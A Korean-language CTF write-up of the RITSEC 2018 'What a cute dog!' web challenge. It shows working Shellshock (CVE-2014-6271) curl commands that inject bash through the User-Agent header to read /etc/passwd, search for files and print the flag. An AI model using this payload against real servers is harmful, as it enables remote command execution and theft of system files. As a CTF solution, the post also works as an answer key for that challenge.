---
title: "[RITSEC 2018] What a cute dog! Write up"
date: 2018-11-19
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, RITSEC2018]
---

주말에 잠깐 짬이 나서 RITSEC CTF에 참여했다.
웹 몇개랑 암호 한개 정도 풀었는데 그 중에 한 문제에 대한 Write Up을 써 두려고 한다.  

<!--more-->

문제 정보는 다음과 같다.  

```plain
This dog is shockingly cute!

fun.ritsec.club:8008

Author: sandw1ch
```

문제에 접속하면 아래와 같은 화면이 보인다.  

![](/images/CTF/RITSEC2018/whatacutedog/whatacutedog_01.png)

아무것도 없어 보이는데, 페이지 소스보기를 하면 iframe으로 `/cgi-bin/stats`를 호출하는 것을 알 수 있다.  

```html

<html>

	<head>

    <style>
    body {
        background-image: url("https://wallpaper-house.com/data/out/6/wallpaper2you_129872.jpg");
    }
    </style>

	<meta name="generator" content="vi2html">
	</head>
	<body>
	</br>
</br>
Has Anyone Really Been Far Even as Decided to Use Even Go Want to do Look More Like?</br>
</br>
Wow, this dog is shockingly cute!</br>
	</br>
Stats:
	</br>
	<iframe frameborder=0 width=800 height=600 src="/cgi-bin/stats"></iframe>
	</body>
</html>
```

해당 경로로 들어가면 아까 봤던 두 줄의 정보만 출력될 뿐, 아무것도 나오는 것이 없다.  

```plain
Sun Nov 18 14:11:01 UTC 2018
14:11:01 up 1 day, 21:58, 0 users, load average: 0.11, 0.31, 0.29
```

뭘까 잠시 고민하다가, 아무 의미 없는 페이지에 뜬금포로 `/cgi-bin/stats`로 들어 가 어떤 정보를 출력하는게 의심스러워서, 이를 가지고 문제를 푸는 것이 아닌가 생각 해 보았다.
그래서 구글에 `cgi-bin/stats exploit`라고 검색 해 보았는데 깃허브에서 이와 관련 된 `CVE`를 찾을 수 있었다.  

> [CVE-2014-6271](https://github.com/hmlio/vaas-cve-2014-6271)

해당 취약점을 가지고 있는 Debian Linux system에서 `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://your-ip:8080/cgi-bin/stats`와 같은 코드를 사용 해 임의의 코드를 실행할 수 있다.
이에 위의 코드를 그대로 문제 서버에 적용 해 보았다.
그랬더니 아래와 같이 `/etc/passwd`가 출력 된 것을 확인할 수 있었다.  

```sh
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://fun.ritsec.club:8008/cgi-bin/stats

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```

그래서 이를 가지고 플래그의 위치를 찾기 위해 `find` 명령어를 실행하도록 아래와 같이 테스트 해 보았다.  

```sh
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -name "*flag*"'" http://fun.ritsec.club:8008//cgi-bin/stats

/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/kpageflags
/usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al
/usr/lib/perl/5.14.2/bits/waitflags.ph
/opt/flag.txt
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
```

그랬더니 `/opt/flag.txt`라는 파일을 찾을 수 있었다.
그래서 이번에는 `/opt/flag.txt`를 읽도록 아래와 같이 실행 해 보았더니 플래그를 찾을 수 있었다.  

```sh
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt'" http://fun.ritsec.club:8008//cgi-bin/stats

RITSEC{sh3ll_sh0cked_w0wz3rs}
```

```plain
RITSEC{sh3ll_sh0cked_w0wz3rs}
```
